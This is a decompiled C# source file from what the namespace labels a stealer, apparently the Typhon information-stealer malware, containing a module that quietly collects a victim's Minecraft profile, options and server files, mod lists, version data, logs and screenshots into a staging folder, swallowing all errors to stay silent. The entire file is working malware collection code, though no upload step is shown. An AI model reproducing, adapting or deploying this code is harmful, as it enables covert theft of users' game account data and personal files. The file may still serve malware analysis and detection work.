using System;
using System.IO;
using Typhon.Modules.Miscellaneous;

namespace Typhon.Stealer.Software.Gaming
{
	// Token: 0x0200001E RID: 30
	internal class Minecraft
	{
		// Token: 0x0600007B RID: 123 RVA: 0x00005368 File Offset: 0x00003568
		private static void SaveVersions(string sSavePath)
		{
			try
			{
				foreach (string path in Directory.GetDirectories(Path.Combine(Minecraft.MinecraftPath, "versions")))
				{
					string name = new DirectoryInfo(path).Name;
					string text = IOHelper.GetDirectorySize(path).ToString() + " bytes";
					string text2 = Directory.GetCreationTime(path).ToString("yyyy-MM-dd h:mm:ss tt");
					File.AppendAllText(sSavePath + "\\versions.txt", string.Concat(new string[]
					{
						"VERSION: ",
						name,
						"\n\tSIZE: ",
						text,
						"\n\tDATE: ",
						text2,
						"\n\n"
					}));
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600007C RID: 124 RVA: 0x0000543C File Offset: 0x0000363C
		private static void SaveMods(string sSavePath)
		{
			try
			{
				foreach (string text in Directory.GetFiles(Path.Combine(Minecraft.MinecraftPath, "mods")))
				{
					string fileName = Path.GetFileName(text);
					string text2 = new FileInfo(text).Length.ToString() + " bytes";
					string text3 = File.GetCreationTime(text).ToString("yyyy-MM-dd h:mm:ss tt");
					File.AppendAllText(sSavePath + "\\Installed Mods.txt", string.Concat(new string[]
					{
						"Mod: ",
						fileName,
						"\n\tSize: ",
						text2,
						"\n\tDate of creation: ",
						text3,
						"\n\n"
					}));
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600007D RID: 125 RVA: 0x00005510 File Offset: 0x00003710
		private static void SaveScreenshots(string sSavePath)
		{
			try
			{
				string[] files = Directory.GetFiles(Path.Combine(Minecraft.MinecraftPath, "screenshots"));
				if (files.Length != 0)
				{
					Directory.CreateDirectory(sSavePath + "\\Screenshots");
					foreach (string text in files)
					{
						File.Copy(text, sSavePath + "\\Screenshots\\" + Path.GetFileName(text));
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600007E RID: 126 RVA: 0x0000558C File Offset: 0x0000378C
		private static void SaveFiles(string sSavePath)
		{
			try
			{
				string[] files = Directory.GetFiles(Minecraft.MinecraftPath);
				for (int i = 0; i < files.Length; i++)
				{
					FileInfo fileInfo = new FileInfo(files[i]);
					string text = fileInfo.Name.ToLower();
					if (text.Contains("profile") || text.Contains("options") || text.Contains("servers"))
					{
						fileInfo.CopyTo(Path.Combine(sSavePath, fileInfo.Name));
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600007F RID: 127 RVA: 0x00005618 File Offset: 0x00003818
		private static void SaveLogs(string sSavePath)
		{
			try
			{
				string path = Path.Combine(Minecraft.MinecraftPath, "logs");
				string text = Path.Combine(sSavePath, "logs");
				if (Directory.Exists(path))
				{
					Directory.CreateDirectory(text);
					string[] files = Directory.GetFiles(path);
					for (int i = 0; i < files.Length; i++)
					{
						FileInfo fileInfo = new FileInfo(files[i]);
						if (fileInfo.Length < Convert.ToInt64(Config.GrabberSizeLimit))
						{
							string text2 = Path.Combine(text, fileInfo.Name);
							if (!File.Exists(text2))
							{
								fileInfo.CopyTo(text2);
							}
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000080 RID: 128 RVA: 0x000056BC File Offset: 0x000038BC
		public static void SaveAll(string sSavePath)
		{
			if (!Directory.Exists(Minecraft.MinecraftPath))
			{
				return;
			}
			try
			{
				Directory.CreateDirectory(sSavePath);
				Minecraft.SaveMods(sSavePath);
				Minecraft.SaveFiles(sSavePath);
				Minecraft.SaveVersions(sSavePath);
				if (!(Config.GrabberModule != "1"))
				{
					Minecraft.SaveLogs(sSavePath);
					Minecraft.SaveScreenshots(sSavePath);
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x0400003F RID: 63
		private static readonly string MinecraftPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), ".minecraft");
	}
}
